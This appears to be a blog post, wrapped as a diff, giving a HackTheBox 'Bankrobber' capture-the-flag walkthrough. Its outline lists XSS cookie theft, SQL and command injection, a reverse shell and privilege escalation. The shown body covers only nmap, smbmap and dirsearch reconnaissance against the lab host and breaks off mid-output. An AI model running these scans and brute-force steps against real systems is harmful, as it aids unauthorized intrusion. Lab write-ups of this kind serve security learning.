@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Quick Summary   → Bankrobber is a Web Application that vulnerable to XSS, SQL Injection and RCE, that I have to exploit to get the Admin credentials by using XSS. SQL Injection to study how’s the bac">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Bankrobber">
+<meta property="og:url" content="https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/index.html">
+<meta property="og:site_name" content="Payas0">
+<meta property="og:description" content="Quick Summary   → Bankrobber is a Web Application that vulnerable to XSS, SQL Injection and RCE, that I have to exploit to get the Admin credentials by using XSS. SQL Injection to study how’s the bac">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-detail1.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/web-page.gif">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/admin.PNG">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/transfer.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-burp1.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-burp-send.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-admin-creds.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-notes-web.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-notes1.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-myid.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-backdoorchecker.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-sql-injection.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-ping.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-XSS.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-impacket.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-initial-shell.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-user.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-winPE.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-910.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-bankv2.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-payload.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-metasploit.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-pincode-wr.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-right-pin.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-transfer0021.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-RCE.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-metasploit-root.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-rooted!.png">
+<meta property="og:image" content="https://ph-payas0.github.io/img/bank/bank-root.png">
+<meta property="article:published_time" content="2020-02-20T10:35:26.000Z">
+<meta property="article:modified_time" content="2020-03-08T02:00:38.604Z">
+<meta property="article:author" content="medz">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pentest">
+<meta property="article:tag" content="xss">
+<meta property="article:tag" content="sql-injection">
+<meta property="article:tag" content="rce">
+<meta property="article:tag" content="windows">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ph-payas0.github.io/img/bank/bank-detail1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon-1.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HackTheBox - Bankrobber</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Payas0" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/projects/">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019-07-12/HackTheBox-Wall/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&text=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&is_video=false&description=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Bankrobber&body=Check out this article: https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&title=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&name=HackTheBox - Bankrobber&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://ph-payas0.github.io/2020-02-20/HackTheBox-Bankrobber/&t=HackTheBox - Bankrobber" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Summary"><span class="toc-number">1.</span> <span class="toc-text">Quick Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Penetration-Testing-Methodologies"><span class="toc-number">2.</span> <span class="toc-text">Penetration Testing Methodologies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Network-Scanning"><span class="toc-number">3.</span> <span class="toc-text">Network Scanning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Walkthrough"><span class="toc-number">3.1.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-results"><span class="toc-number">3.2.</span> <span class="toc-text">Nmap results</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Enumeration"><span class="toc-number">4.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL-on-port-3306"><span class="toc-number">4.1.</span> <span class="toc-text">MySQL on port 3306</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-on-port-445"><span class="toc-number">4.2.</span> <span class="toc-text">SMB on port 445</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brutefore-Web-directories"><span class="toc-number">4.3.</span> <span class="toc-text">Brutefore Web directories</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post - Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-account-and-Login"><span class="toc-number">5.1.</span> <span class="toc-text">Create account and Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Steal-Admin-creds-via-Cookies"><span class="toc-number">5.2.</span> <span class="toc-text">Steal Admin creds via Cookies</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Login-as-Admin"><span class="toc-number">5.3.</span> <span class="toc-text">Login as Admin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">6.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-and-SQL-Injection"><span class="toc-number">6.1.</span> <span class="toc-text">XSS and SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-Reverse-Shell"><span class="toc-number">6.2.</span> <span class="toc-text">Get Reverse Shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">7.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">7.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Process-and-Active-Connections"><span class="toc-number">7.2.</span> <span class="toc-text">Process and Active Connections</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Customizing-custom-Meterpreter-loader"><span class="toc-number">7.3.</span> <span class="toc-text">Customizing custom Meterpreter loader</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-force-digit-code"><span class="toc-number">7.4.</span> <span class="toc-text">Brute force digit code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Code-Execution-RCE"><span class="toc-number">7.5.</span> <span class="toc-text">Remote Code Execution (RCE)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Administrator-Shell"><span class="toc-number">7.6.</span> <span class="toc-text">Administrator Shell</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Bankrobber
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Payas0</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-02-20T10:35:26.000Z" itemprop="datePublished">20-02-2020</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/HackTheBox/">HackTheBox</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="tag-link" href="/tags/pentest/" rel="tag">pentest</a>, <a class="tag-link" href="/tags/rce/" rel="tag">rce</a>, <a class="tag-link" href="/tags/sql-injection/" rel="tag">sql-injection</a>, <a class="tag-link" href="/tags/windows/" rel="tag">windows</a>, <a class="tag-link" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p><img src="/img/bank/bank-detail1.png" alt="HackTheBox-Bankrobber/bank-detail.png" title="Bankrobber machine details"></p>
+<h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Bankrobber is a Web Application that vulnerable to <code>XSS</code>, <code>SQL Injection</code> and <code>RCE</code>, that I have to exploit to get the Admin credentials by using XSS. SQL Injection to study how’s the <code>backdoorchecker.php</code> work, do command injection inside the machine from Web Application to get a reverse shell.<br>   Inside the machine’ I did portforwarding to test the E-Coin transfer’ from there I managed to inject RCE and get the root.</p>
+<h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol>
+<li><p><strong>Network Scanning</strong></p>
+<p>→ Nmap scan</p>
+<p>→ discover open ports and what services are running</p>
+</li>
+<li><p><strong>Enumeration</strong></p>
+<p>→ Browsing the HTTP Service</p>
+<p>→ MySQL and SMB open</p>
+<p>→ Bruteforce the Web page directories</p>
+</li>
+<li><p><strong>Post - Exploitation</strong></p>
+<p>→ Create account and Login</p>
+<p>→ Transfer any amount of e-coin</p>
+<p>→ Do client side attack</p>
+<p>→ Use XSS to steal admin credentials</p>
+<p>→ Login as admin and find some interesting in the page</p>
+</li>
+<li><p><strong>Exploitation</strong></p>
+<p>→ Found an XSS and SQL Injection vulnerabilites in <code>search.php</code> and <code>backdoorchecker.php</code></p>
+<p>→ Upload a webshell to the server and get a reverse shell</p>
+</li>
+<li><p><strong>Privilege Escalation</strong></p>
+<p>→ Use <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a>. or <code>Windows privilege escalation with cmd</code></p>
+<p>→ Looking at running process and active connections inside the machine</p>
+<p>→ Use obfuscated meterpreter and tunnel the network with Portforwarding</p>
+<p>→ Bruteforce the digit code and test the E-coin transfer</p>
+<p>→ Found <code>RCE</code>(Remote Code Execution) in E-coin transfer</p>
+<p>→ Gain the Administrator shell</p>
+</li>
+</ol>
+<hr>
+<h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, I run the <strong>Nmap</strong> to scan the target and get information about the various services that are running on the target machine. I use</p>
+<hr>
+<ul>
+<li>-sV ⇒ Probe open ports to determine service/version info</li>
+<li>-sC ⇒ equivalent to —script=default</li>
+<li>-p- ⇒ Scan all 65535 ports</li>
+<li>-oN ⇒ to save our scan results to a text file</li>
+</ul>
+<hr>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-p-</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.154</span> <span class="string">-oN</span> <span class="string">nmap-Bankrobber</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p>Which found opened ports 80, 443, 445 and 3306</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ nmap -sV -sC -O -T4 -oN nmap-bankrobber 10.10.10.154</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-08 03:12 PST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.154</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">80/tcp   open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: E-coin</span><br><span class="line">443/tcp  open  tcpwrapped</span><br><span class="line">|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4</span><br><span class="line">|_http-title: Bad request!</span><br><span class="line">| ssl-cert: Subject: commonName=localhost</span><br><span class="line">| Not valid before: 2009-11-10T23:48:47</span><br><span class="line">|_Not valid after:  2019-11-08T23:48:47</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">445/tcp  open  tcpwrapped</span><br><span class="line">3306/tcp open  tcpwrapped</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|phone</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|10|Phone (90%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (90%), Microsoft Windows 10 1511 - 1607 (85%), Microsoft Windows 8.1 Update 1 (85%), Microsoft Windows Phone 7.5 or 8.0 (85%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h02m13s, deviation: 0s, median: 1h02m13s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-03-07T20:15:16</span><br><span class="line">|_  start_date: 2020-03-07T10:51:24</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 78.81 seconds</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 1m19s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure>
+
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>I visited the web page in port 80 and it’s present a Bitcoin web page with Login and Register form.</p>
+<p><img src="/img/bank/web-page.gif" alt="HackTheBox-Bankrobber/web-page.gif" title="Bankrobber Web Page"></p>
+<h3 id="MySQL-on-port-3306"><a href="#MySQL-on-port-3306" class="headerlink" title="MySQL on port 3306"></a>MySQL on port 3306</h3><p>The MySQL port is open so I try to connect with it but it couldn’t</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ mysql -h 10.10.10.154 --port 3306</span><br><span class="line">ERROR 1130 (HY000): Host <span class="string">'10.10.15.71'</span> is not allowed to connect to this MariaDB server</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-on-port-445"><a href="#SMB-on-port-445" class="headerlink" title="SMB on port 445"></a>SMB on port 445</h3><p>connecting to SMB is not helpful too.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber took 2s </span><br><span class="line">❯ smbmap -H 10.10.10.154 -u bank</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br><span class="line">[!] Authentication error on 10.10.10.154</span><br></pre></td></tr></table></figure>
+
+<h3 id="Brutefore-Web-directories"><a href="#Brutefore-Web-directories" class="headerlink" title="Brutefore Web directories"></a>Brutefore Web directories</h3><p>I also run <a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">dirsearch</a> <code>Web path scanner</code> to look if there’s any interesting web directories.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2<span class="number">.7</span><span class="number">.17</span> </span><br><span class="line">❯ ./dirsearch.py -u <span class="string">"http://10.10.10.154"</span> -e asd -t <span class="number">50</span></span><br><span class="line"></span><br><span class="line"> _|. _ _  _  _  _ _|_    v0<span class="number">.3</span><span class="number">.9</span></span><br><span class="line">(_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: asd | HTTP method: get | Threads: <span class="number">50</span> | Wordlist size: <span class="number">6109</span></span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors<span class="number">-20</span><span class="number">-03</span><span class="number">-06</span>_18<span class="number">-13</span><span class="number">-45.l</span>og</span><br><span class="line"></span><br><span class="line">Target: http://<span class="number">10.10</span><span class="number">.10</span><span class="number">.154</span></span><br><span class="line"></span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">46</span>] Starting: </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">47</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /%<span class="number">3</span>f/        </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">47</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /%<span class="number">20.</span>./</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">47</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /%ff/             </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccessOLD                             </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.ht_wsr.txt     </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess-marco</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess-local</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.hta</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess-dev</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.sample</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.BAK</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess_orig</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.bak1</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.txt</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess_sc</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.old</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess_extra</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.orig</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess.save</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccessOLD2</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccess~</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htaccessBAK</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htgroup</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htpasswd-old</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htpasswd_test</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htpasswds</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">49</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /.htusers</span><br><span class="line">[18:13:54] 301 -  336B  - /Admin  -&gt;  http://10.10.10.154/Admin/                 </span><br><span class="line">[18:13:54] 301 -  336B  - /admin  -&gt;  http://10.10.10.154/admin/</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">54</span>] <span class="number">200</span> -   <span class="number">40</span>B  - /admin%<span class="number">20</span>/          </span><br><span class="line">[18:13:54] 301 -  336B  - /ADMIN  -&gt;  http://10.10.10.154/ADMIN/</span><br><span class="line">[18:13:54] 301 -  337B  - /admin.  -&gt;  http://10.10.10.154/admin./</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">55</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /admin/.htaccess   </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">55</span>] <span class="number">200</span> -   <span class="number">40</span>B  - /admin/                </span><br><span class="line">[<span class="number">18</span>:<span class="number">13</span>:<span class="number">55</span>] <span class="number">200</span> -   <span class="number">40</span>B  - /admin/index.php                                                                  </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">05</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /cgi-bin/                                                                               </span><br><span class="line">[18:14:10] 301 -  334B  - /css  -&gt;  http://10.10.10.154/css/                   </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">15</span>] <span class="number">403</span> -    <span class="number">1</span>KB - /error/                                         </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">503</span> -    <span class="number">1</span>KB - /examples/servlets/index.html                                               </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">503</span> -    <span class="number">1</span>KB - /examples/servlets/servlet/RequestHeaderExample</span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">503</span> -    <span class="number">1</span>KB - /examples/servlets/servlet/CookieExample</span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">503</span> -    <span class="number">1</span>KB - /examples </span><br><span class="line">[<span class="number">18</span>:<span class="number">14</span>:<span class="number">17</span>] <span class="number">503</span> -    <span class="number">1</span>KB - /examples/</span><br><span class="line">[18:14:17] 301 -  336B  - /fonts  -&gt;  http://10.10.10.154/fonts/</span><br><span class="line">[18:14:21] 301 -  334B  - /img  -&gt;  http://10.10.10.154/img/                        </span><br><span class="line">[<span 